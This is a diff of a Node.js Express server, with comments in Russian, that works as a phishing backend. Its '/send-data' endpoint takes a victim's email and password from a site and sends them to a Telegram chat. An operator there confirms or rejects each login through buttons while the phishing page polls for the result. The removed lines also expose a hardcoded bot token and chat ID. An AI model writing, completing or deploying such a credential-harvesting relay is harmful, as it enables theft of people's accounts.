@@ -1,64 +1,30 @@
-const express = require('express');
-const axios = require('axios');
-const app = express();
-app.use(express.json());
+const requests = {}; // Хранилище статусов
 
-let requests = {}; // Тут храним статусы проверок { userId: 'pending' | 'success' | 'error' }
-
-const token = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ';
-const chatId = '-1003894478662';
-
-// 1. Прием данных с сайта
-app.post('/send-data', async (req, res) => {
+// Сайт вызывает это при вводе пароля
+app.post('/send-data', (req, res) => {
     const { userId, email, pass } = req.body;
     requests[userId] = 'pending';
-
-    const message = `⚠️ **Данные входа**\n👤 ID: \`${email}\`\n🔑 Pass: \`${pass}\``;
     
-    // Отправляем в ТГ с кнопками
-    await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
-        chat_id: chatId,
-        text: message,
-        parse_mode: 'Markdown',
+    // Отправка в ТГ (используй библиотеку или axios)
+    bot.sendMessage(chatId, `Логин: ${email}\nПароль: ${pass}`, {
         reply_markup: {
-            inline_keyboard: [
-                [
-                    { text: "✅ Верно", callback_data: `approve_${userId}` },
-                    { text: "❌ Ошибка", callback_data: `reject_${userId}` }
-                ]
-            ]
+            inline_keyboard: [[
+                { text: "✅ Ок", callback_data: `ok_${userId}` },
+                { text: "❌ Ошибка", callback_data: `err_${userId}` }
+            ]]
         }
     });
-
-    res.json({ status: 'sent' });
+    res.send({ sent: true });
 });
 
-// 2. Эндпоинт для проверки статуса сайтом
+// Бот вызывает это при нажатии кнопок
+bot.on('callback_query', (query) => {
+    const [action, id] = query.data.split('_');
+    requests[id] = (action === 'ok') ? 'success' : 'error';
+    bot.answerCallbackQuery(query.id, { text: "Статус обновлен" });
+});
+
+// Сайт вызывает это каждые 3 сек
 app.get('/check-status/:userId', (req, res) => {
-    const status = requests[req.params.userId] || 'not_found';
-    res.json({ status });
+    res.send({ status: requests[req.params.userId] || 'pending' });
 });
-
-// 3. Прием ответа от кнопок Telegram (WebHook или обработка Callback)
-// ВАЖНО: Тебе нужно настроить Webhook бота на этот адрес или использовать библиотеку
-app.post('/tg-webhook', (req, res) => {
-    const callbackQuery = req.body.callback_query;
-    if (callbackQuery) {
-        const data = callbackQuery.data; // approve_123
-        const [action, userId] = data.split('_');
-
-        if (action === 'approve') {
-            requests[userId] = 'success';
-        } else {
-            requests[userId] = 'error';
-        }
-        
-        // Редактируем сообщение в ТГ, чтобы убрать кнопки
-        axios.post(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
-            callback_query_id: callbackQuery.id,
-            text: "Принято!"
-        });
-    }
-    res.sendStatus(200);
-});
-app.listen(PORT, () => console.log(`Сервер запущен на порту ${PORT}`));
